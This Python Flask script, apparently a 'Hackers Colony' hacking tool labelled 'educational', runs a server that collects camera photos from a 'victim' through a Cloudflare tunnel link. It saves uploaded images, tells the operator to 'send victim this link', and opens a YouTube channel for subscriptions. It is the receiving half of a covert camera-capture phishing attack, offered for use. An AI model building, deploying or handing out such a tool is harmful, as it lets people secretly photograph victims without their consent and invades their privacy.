#!/usr/bin/env python3
"""
HCO-CAM-TAM - Educational Camera Tool
By Azhar (Hackers Colony)
"""

from flask import Flask, request
import os, time, webbrowser
from colorama import Fore, Style, init
import subprocess

init(autoreset=True)  # Auto reset colors

# ---------------- CONFIG ----------------
CLOUDFLARE_TUNNEL = "https://spirituality-sustainable-normal-bones.trycloudflare.com"
YOUTUBE_URL = "https://youtube.com/@hackers_colony_tech?si=pvdCWZggTIuGb0ya"
PORT = 8080
TOTAL_IMAGES = 10  # 5 front + 5 back

# Initialize Flask
app = Flask(__name__)

# Ensure 'received' folder exists
os.makedirs("received", exist_ok=True)

# ---------------- HELPERS ----------------
def countdown(seconds=8):
    for i in range(seconds, 0, -1):
        print(Fore.CYAN + Style.BRIGHT + f"[+] Unlocking tool in {i}..." + Style.RESET_ALL)
        time.sleep(1)

def display_banner():
    os.system('clear')
    print("\n" + Fore.RED + Style.BRIGHT + "HCO CAM TAM" + Style.RESET_ALL)
    print(Fore.GREEN + Style.BRIGHT + "by Azhar - Camera Tool\n" + Style.RESET_ALL)
    print(Fore.CYAN + f"[*] Victim link: {CLOUDFLARE_TUNNEL}\n" + Style.RESET_ALL)

def open_links():
    # Auto open YouTube for subscription
    try:
        webbrowser.open(YOUTUBE_URL)
        print(Fore.YELLOW + "[*] Redirected to YouTube..." + Style.RESET_ALL)
    except:
        # fallback for Termux
        subprocess.run(["termux-open-url", YOUTUBE_URL])

    # Auto open Cloudflare victim link
    try:
        webbrowser.open(CLOUDFLARE_TUNNEL)
        print(Fore.YELLOW + "[*] Cloudflare victim link opened..." + Style.RESET_ALL)
    except:
        subprocess.run(["termux-open-url", CLOUDFLARE_TUNNEL])

# ---------------- FLASK ROUTES ----------------
@app.route('/capture', methods=['POST'])
def capture():
    files = request.files.getlist('images')
    for f in files:
        filename = f.filename
        f.save(f"received/{filename}")
        print(Fore.GREEN + f"[+] Image received: {filename}" + Style.RESET_ALL)
    
    total_received = len(os.listdir("received"))
    if total_received >= TOTAL_IMAGES:
        print(Fore.RED + f"[!] All {TOTAL_IMAGES} images received!" + Style.RESET_ALL)
    return "Images received!"

@app.route('/')
def index():
    return f"""
    <h1 style='color:red; font-size:48px;'>HCO CAM TAM</h1>
    <p style='color:green; font-size:24px;'>by Azhar - Camera Tool</p>
    <p>Send victim this link: <a href='{CLOUDFLARE_TUNNEL}' target='_blank'>{CLOUDFLARE_TUNNEL}</a></p>
    """

# ---------------- MAIN ----------------
if __name__ == "__main__":
    countdown(8)
    open_links()
    display_banner()
    
    print(Fore.YELLOW + f"[*] Flask server running on port {PORT}..." + Style.RESET_ALL)
    print(Fore.CYAN + "[*] Waiting for images to be received..." + Style.RESET_ALL)
    app.run(host="0.0.0.0", port=PORT, debug=False)
